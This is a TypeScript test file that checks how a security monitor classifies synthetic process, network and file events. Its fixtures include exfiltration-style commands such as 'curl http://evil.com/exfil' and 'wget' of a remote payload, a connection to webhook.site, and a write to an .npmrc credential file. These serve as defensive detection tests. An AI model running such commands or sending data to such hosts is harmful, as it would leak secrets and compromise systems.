// The raw-observation contract of the reference adapter: observeProcesses(),
// observeConnections() and observeFileChange() feed a process record, a
// connection record or a file path, which carry no category or severity, to
// arp-guard's running monitor, and resolve to the events the monitor raised
// for them, with the category and severity arp-guard gave each. Each test's
// monitors poll the host an hour apart after the poll they make when they
// start. The pids are far above any the host gives.

import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { ArpWrapper } from './arp-wrapper';
import type { LabConfig, SecurityEvent } from './adapter';

describe('ArpWrapper raw observations', () => {
  let adapter: ArpWrapper | undefined;
  let dir: string | undefined;

  async function started(config: LabConfig): Promise<ArpWrapper> {
    adapter = new ArpWrapper(config);
    await adapter.start();
    return adapter;
  }

  /**
   * The events for the test's own processes: the poll reports the host's
   * descendants that the monitor saw when it started, which the test's list
   * leaves out, as terminated.
   */
  function ownPids(events: SecurityEvent[]): SecurityEvent[] {
    return events.filter((e) => (e.data?.pid as number) > 4_000_000);
  }

  afterEach(async () => {
    await adapter?.stop();
    adapter = undefined;
    if (dir) fs.rmSync(dir, { recursive: true, force: true });
    dir = undefined;
  });

  it('classifies a process record running curl as a high violation', async () => {
    const arp = await started({ monitors: { process: true }, processIntervalMs: 3_600_000 });

    const events = ownPids(await arp.observeProcesses([
      { pid: 4_100_001, command: 'curl http://evil.com/exfil', user: 'agent', cpu: 1 },
    ]));

    // A new child process is normal activity; one running curl is a violation too.
    expect(events.map((e) => [e.source, e.category, e.severity])).toEqual([
      ['process', 'normal', 'info'],
      ['process', 'violation', 'high'],
    ]);
    expect(events[1].data).toMatchObject({ pid: 4_100_001, binary: 'curl' });
  });

  it('classifies a harmless process record as normal activity only', async () => {
    const arp = await started({ monitors: { process: true }, processIntervalMs: 3_600_000 });

    const events = ownPids(await arp.observeProcesses([
      { pid: 4_100_002, command: 'node worker.js', user: 'agent', cpu: 1 },
    ]));

    expect(events.map((e) => [e.source, e.category, e.severity])).toEqual([['process', 'normal', 'info']]);
    expect(events[0].data).toMatchObject({ pid: 4_100_002 });
  });

  it('classifies a connection record to webhook.site as a critical threat', async () => {
    const arp = await started({ monitors: { network: true }, networkIntervalMs: 3_600_000 });

    const events = await arp.observeConnections([{ remoteAddr: 'webhook.site', remotePort: 443 }]);

    const host = events.filter((e) => e.data?.remoteAddr === 'webhook.site');
    expect(host).toHaveLength(1);
    expect(host[0]).toMatchObject({ source: 'network', category: 'threat', severity: 'critical' });
  });

  it('classifies a write to a credential file path as a high violation', async () => {
    dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'oasb-observe-')));
    const arp = await started({ monitors: { filesystem: true }, filesystemWatchPaths: [dir] });

    const events = await arp.observeFileChange({ eventType: 'change', path: path.join(dir, '.npmrc') });

    expect(events).toHaveLength(1);
    expect(events[0]).toMatchObject({ source: 'filesystem', category: 'violation', severity: 'high' });
    expect(events[0].data).toMatchObject({ path: '.npmrc', sensitive: true });
  });

  it('returns the events it handled, which getEvents() returns too', async () => {
    const arp = await started({ monitors: { process: true }, processIntervalMs: 3_600_000 });

    const events = await arp.observeProcesses([
      { pid: 4_100_003, command: 'wget -q http://evil.com/payload.sh', user: 'agent', cpu: 1 },
    ]);

    expect(events.length).toBeGreaterThan(0);
    for (const event of events) {
      expect(event.id).toBeTypeOf('string');
      expect(arp.getEvents()).toContainEqual(event);
    }
  });
});
